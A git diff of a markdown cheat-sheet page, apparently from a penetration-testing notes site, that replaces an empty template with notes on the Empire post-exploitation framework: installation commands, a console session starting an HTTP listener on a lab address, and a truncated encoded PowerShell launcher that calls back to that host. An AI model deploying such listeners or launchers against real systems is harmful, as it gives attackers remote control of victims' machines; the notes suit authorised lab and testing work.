@@ -1,18 +1,18 @@
 ---
 ### The title for the content.
-title : "docker compose"
+title : "empire"
 ### If set, this will be used for the page's menu entry (instead of the `title` attribute)
-# menuTitle : "docker compose"
+# menuTitle : "empire"
 ### The title of the page in menu will be prefixed by this HTML content
 # pre : ""
 ### The title of the page in menu will be postfixed by this HTML content
 # post : ""
 ### The description for the content.
-description : "docker compose description."
+description : "empire description."
 ### The datetime assigned to this page.
-date : 2020-03-10T16:36:30+01:00
+date : 2020-03-11T10:40:17+01:00
 ### Appears as the tail of the output URL. A value specified in front matter will override the segment of the URL based on the filename.
-# slug : "docker-compose"
+# slug : "empire"
 ### Aliases can be used to create redirects to your page from other URLs.
 # aliases : [""]
 ### Display name of this page modifier. If set, it will be displayed in the footer.
@@ -35,32 +35,58 @@ weight : 0
 # tags : [""]
 ---
 
-## docker compose
+## empire
 
-### Installation
+### Install
+
+#### System
 
 ```bash
-
+git clone https://github.com/EmpireProject/Empire
+cd Empire
+sudo ./setup/install.sh
 ```
 
-### Usage
+#### Docker
 
 ```bash
-
-```
-
-### Flags
-
-```bash
-
+docker pull empireproject/empire
 ```
 
 ### Examples
 
-```bash
+#### Reset DB
 
+```bash
+/empire/setup/reset.sh
+```
+
+#### setup basic listener and gen launcher
+
+```bash
+(Empire) > listeners
+[!] No listeners currently active
+(Empire: listeners) > uselistener http
+(Empire: listeners/http) > set Host http://10.10.14.24:80
+(Empire: listeners/http) > set BindIP 10.10.14.24
+(Empire: listeners/http) > set Port 80
+(Empire: listeners/http) > execute
+[*] Starting listener 'http'
+ * Serving Flask app "http" (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: off
+[+] Listener successfully started!
+(Empire: listeners/http) > back
+(Empire: listeners) > launcher
+[!] Please enter 'launcher <language> <listenerName>'
+(Empire: listeners) > launcher powershell http
+powershell -noP -sta -w 1 -enc  SQBmACgAJABQAF.....kAEsAKQApAHwASQBFAFgA
 ```
 
 ### Also see
 
-* [a url](https://a.url)
+* [Github project](https://github.com/EmpireProject/Empire)
+* [Quickstart](http://www.powershellempire.com/?page_id=110)
+* [Documentation](http://www.powershellempire.com/?page_id=83)
